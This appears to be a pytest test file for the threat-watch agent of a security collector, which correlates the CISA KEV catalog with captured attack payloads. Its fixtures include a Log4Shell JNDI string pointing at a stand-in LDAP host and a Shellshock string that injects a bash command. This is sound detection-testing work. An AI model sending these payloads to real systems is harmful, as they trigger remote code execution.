"""Agent de veille (S4-11) : KEV récupéré, corrélé à nos charges utiles, pannes sans effet."""

from datetime import UTC, date, datetime, timedelta
from ipaddress import ip_address

import httpx
import pytest
from httpx import ASGITransport, AsyncClient

from shield.collector.api import app as api
from shield.collector.api.auth import create_access_token
from shield.collector.repositories import InMemoryEventRepository
from shield.collector.watch import (
    SIGNATURES,
    build_entries,
    correlate,
    fetch_kev,
    refresh,
    seconds_until,
)
from shield.common.schema import NormalizedEvent, ServiceName, Verdict

TODAY = date(2026, 10, 12)

KEV = [
    {
        "cveID": "CVE-2021-44228",
        "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability",
        "shortDescription": "JNDI features do not protect against attacker-controlled LDAP.",
        "dateAdded": "2021-12-10",
    },
    {
        "cveID": "CVE-2026-0001",
        "vulnerabilityName": "Exemple récent",
        "shortDescription": "Ajouté il y a peu.",
        "dateAdded": "2026-10-01",
    },
    {
        "cveID": "CVE-2010-0001",
        "vulnerabilityName": "Ancien, sans signature",
        "shortDescription": "Hors de la fenêtre de 30 jours.",
        "dateAdded": "2012-01-01",
    },
]


async def store(repo, payload: bytes):
    event = NormalizedEvent(
        service=ServiceName.HTTP,
        source_ip=ip_address("198.51.100.20"),
        source_port=1,
        dest_port=80,
        payload=payload,
        occurred_at=datetime(2026, 10, 12, 8, 0, tzinfo=UTC),
    )
    verdict = Verdict(
        event_id=event.event_id, session_id=None, threat_score=0, profile="indetermine"
    )
    await repo.save(event, verdict)
    return event


def test_les_entrees_couvrent_signatures_et_ajouts_recents():
    entries = {entry["cve_id"]: entry for entry in build_entries(KEV, TODAY)}
    assert "CVE-2026-0001" in entries, "ajout récent au catalogue"
    assert "CVE-2010-0001" not in entries, "ancien et sans signature : bruit"
    assert {s.cve_id for s in SIGNATURES} <= entries.keys()
    assert entries["CVE-2021-44228"]["kev_flag"] is True
    assert entries["CVE-2021-44228"]["summary"].startswith("Apache Log4j2")
    assert entries["CVE-2014-6271"]["kev_flag"] is False, "absente du catalogue fourni"


async def test_une_cve_observee_chez_nous():
    repo = InMemoryEventRepository()
    await store(repo, b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1")
    await store(repo, b"GET / HTTP/1.1")

    async def fetch():
        return KEV

    assert await refresh(repo, fetch) == 1
    [first, *_] = await repo.watch_entries()
    assert first["cve_id"] == "CVE-2021-44228"
    assert first["matched_events"] == 1


async def test_une_attaque_posterieure_au_passage_quotidien_est_correlee():
    """La corrélation tourne entre deux passages quotidiens : pas d'attente jusqu'à 4 h."""
    repo = InMemoryEventRepository()

    async def fetch():
        return KEV

    assert await refresh(repo, fetch) == 0
    await store(repo, b"GET /?x=${jndi:ldap://198.51.100.9/a} HTTP/1.1")
    assert await correlate(repo) == 1
    entries = {entry["cve_id"]: entry for entry in await repo.watch_entries()}
    assert entries["CVE-2021-44228"]["matched_events"] == 1


async def test_catalogue_injoignable_sans_effet():
    repo = InMemoryEventRepository()
    await store(repo, b"() { :;}; /bin/bash -c id")

    async def broken():
        raise httpx.ConnectError("hors ligne")

    assert await refresh(repo, broken) == 1, "les signatures locales suffisent à corréler"
    entries = {entry["cve_id"]: entry for entry in await repo.watch_entries()}
    assert entries["CVE-2014-6271"]["matched_events"] == 1


async def test_lecture_du_catalogue():
    def handler(request):
        return httpx.Response(200, json={"vulnerabilities": KEV + [{"pas": "de cveID"}]})

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as http:
        assert [item["cveID"] for item in await fetch_kev(http)] == [k["cveID"] for k in KEV]


async def test_catalogue_en_erreur():
    transport = httpx.MockTransport(lambda r: httpx.Response(503))
    async with httpx.AsyncClient(transport=transport) as http:
        with pytest.raises(httpx.HTTPStatusError):
            await fetch_kev(http)


def test_execution_planifiee_a_quatre_heures():
    day = datetime(2026, 10, 12, tzinfo=UTC)
    assert seconds_until(4, day.replace(hour=3)) == 3600
    assert seconds_until(4, day.replace(hour=4)) == 86_400
    assert seconds_until(4, day.replace(hour=5)) == timedelta(hours=23).total_seconds()


async def test_routes_de_veille():
    repo = InMemoryEventRepository()
    api.app.state.repository = repo
    jndi = await store(repo, b"${jndi:ldap://x/a}")

    async def fetch():
        return KEV

    await refresh(repo, fetch)
    token, _ = create_access_token("admin")
    async with AsyncClient(
        transport=ASGITransport(app=api.app),
        base_url="http://t",
        headers={"Authorization": f"Bearer {token}"},
    ) as http:
        items = (await http.get("/api/v1/watch")).json()["items"]
        events = (await http.get("/api/v1/watch/CVE-2021-44228/events")).json()
        unknown = await http.get("/api/v1/watch/CVE-2026-0001/events")
    del api.app.state.repository

    assert items[0]["cve_id"] == "CVE-2021-44228" and items[0]["observed"]
    assert [e["event_id"] for e in events["items"]] == [str(jndi.event_id)]
    assert unknown.status_code == 404
